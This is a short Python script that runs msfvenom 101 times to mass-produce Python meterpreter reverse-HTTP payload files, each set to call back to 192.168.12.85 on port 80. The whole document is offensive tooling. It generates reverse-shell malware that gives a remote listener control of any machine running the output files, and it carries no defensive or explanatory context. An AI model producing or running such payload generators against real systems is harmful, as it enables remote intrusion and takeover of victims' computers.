#!/usr/bin/python3
import os
for i in range(0,101):
    os.system("msfvenom -p  python/meterpreter_reverse_http  lhost=192.168.12.85 lport=80 -f raw >pythonreverse"+str(i)+".py")
print("done")
